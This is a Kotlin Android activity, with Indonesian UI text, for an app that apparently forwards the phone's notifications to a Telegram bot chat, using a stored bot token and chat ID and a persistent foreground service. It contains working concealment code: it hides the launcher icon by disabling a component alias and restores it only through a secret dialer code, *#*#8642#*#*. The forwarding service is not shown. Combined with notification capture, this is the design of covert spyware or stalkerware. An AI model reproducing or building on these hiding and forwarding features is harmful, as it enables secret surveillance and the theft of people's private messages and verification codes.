package com.notifforwarder.app

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var etBotToken: EditText
    private lateinit var etChatId: EditText
    private lateinit var etPrefix: EditText
    private lateinit var switchEnabled: Switch
    private lateinit var btnSave: Button
    private lateinit var btnGrant: Button
    private lateinit var btnHide: Button
    private lateinit var btnFilter: Button
    private lateinit var tvStatus: TextView
    private lateinit var tvIconStatus: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etBotToken  = findViewById(R.id.etBotToken)
        etChatId    = findViewById(R.id.etChatId)
        etPrefix    = findViewById(R.id.etPrefix)
        switchEnabled = findViewById(R.id.switchEnabled)
        btnSave     = findViewById(R.id.btnSave)
        btnGrant    = findViewById(R.id.btnGrant)
        btnHide     = findViewById(R.id.btnHide)
        btnFilter   = findViewById(R.id.btnFilter)
        tvStatus    = findViewById(R.id.tvStatus)
        tvIconStatus = findViewById(R.id.tvIconStatus)

        // Load saved settings
        val prefs = getSharedPreferences("notif_prefs", MODE_PRIVATE)
        etBotToken.setText(prefs.getString("bot_token", ""))
        etChatId.setText(prefs.getString("chat_id", ""))
        etPrefix.setText(prefs.getString("prefix", "📱 Notifikasi dari HP:"))
        switchEnabled.isChecked = prefs.getBoolean("enabled", true)

        // Start persistent foreground service
        startForegroundService(Intent(this, PersistentService::class.java))

        btnSave.setOnClickListener {
            val token = etBotToken.text.toString().trim()
            val chatId = etChatId.text.toString().trim()
            val prefix = etPrefix.text.toString().trim()

            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Bot Token dan Chat ID wajib diisi!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            prefs.edit()
                .putString("bot_token", token)
                .putString("chat_id", chatId)
                .putString("prefix", prefix)
                .putBoolean("enabled", switchEnabled.isChecked)
                .apply()

            Toast.makeText(this, "✅ Pengaturan disimpan!", Toast.LENGTH_SHORT).show()
            updateStatus()
        }

        btnGrant.setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        btnHide.setOnClickListener {
            if (isIconVisible()) {
                showHideConfirmDialog()
            } else {
                showIcon()
            }
        }

        btnFilter.setOnClickListener {
            startActivity(Intent(this, AppFilterActivity::class.java))
        }

        updateStatus()
        updateIconStatus()
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
        updateIconStatus()
    }

    // ── Sembunyikan / tampilkan ikon ─────────────────────────────────────────

    private fun isIconVisible(): Boolean {
        val alias = ComponentName(this, "com.notifforwarder.app.MainLauncher")
        val state = packageManager.getComponentEnabledSetting(alias)
        return state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }

    private fun hideIcon() {
        val alias = ComponentName(this, "com.notifforwarder.app.MainLauncher")
        packageManager.setComponentEnabledSetting(
            alias,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        updateIconStatus()
        Toast.makeText(this, "✅ Ikon disembunyikan!\nKetik *#*#8642#*#* di dial pad untuk membuka kembali.", Toast.LENGTH_LONG).show()
        // Tutup activity setelah sembunyikan
        finish()
    }

    private fun showIcon() {
        val alias = ComponentName(this, "com.notifforwarder.app.MainLauncher")
        packageManager.setComponentEnabledSetting(
            alias,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        updateIconStatus()
        Toast.makeText(this, "✅ Ikon ditampilkan kembali di beranda.", Toast.LENGTH_SHORT).show()
    }

    private fun showHideConfirmDialog() {
        AlertDialog.Builder(this)
            .setTitle("Sembunyikan Ikon?")
            .setMessage("App akan disembunyikan dari beranda.\n\nUntuk membuka kembali, buka dial pad lalu ketik:\n\n★  *#*#8642#*#*  ★\n\nPastikan kamu ingat kode ini!")
            .setPositiveButton("Ya, Sembunyikan") { _, _ -> hideIcon() }
            .setNegativeButton("Batal", null)
            .show()
    }

    // ── Status ────────────────────────────────────────────────────────────────

    private fun isNotificationListenerEnabled(): Boolean {
        val cn = ComponentName(this, NotificationForwarderService::class.java)
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(cn.flattenToString())
    }

    private fun updateStatus() {
        if (isNotificationListenerEnabled()) {
            tvStatus.text = "✅ Izin notifikasi: AKTIF"
            tvStatus.setTextColor(getColor(android.R.color.holo_green_dark))
        } else {
            tvStatus.text = "❌ Izin notifikasi: BELUM DIBERIKAN\nTekan 'Izinkan Akses' di bawah"
            tvStatus.setTextColor(getColor(android.R.color.holo_red_dark))
        }
    }

    private fun updateIconStatus() {
        if (isIconVisible()) {
            tvIconStatus.text = "👁 Ikon: TERLIHAT di beranda"
            btnHide.text = "🙈 Sembunyikan Ikon"
        } else {
            tvIconStatus.text = "🙈 Ikon: TERSEMBUNYI"
            btnHide.text = "👁 Tampilkan Ikon Kembali"
        }
    }
}
